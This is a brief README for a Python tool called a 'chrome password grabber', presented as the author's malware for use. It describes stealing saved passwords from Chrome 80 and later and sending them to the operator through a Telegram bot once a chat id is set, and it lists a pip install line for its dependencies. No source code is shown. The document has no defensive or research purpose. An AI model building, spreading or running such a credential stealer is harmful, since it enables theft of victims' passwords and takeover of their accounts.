# chrome-password-grabber


This is a chrome password grabber by Ferantic

It works only on chrome 80 and above.

It sends the chrome passwords using a telegram bot,it is easy to use and is written in python.All you have to do is put your chat id.

you need to install requirements.txt for it to work, I might make it do that automatically later but who knows.

```bash
pip install pywin32 pycryptodome pypsexec requests
```
into cmd first.
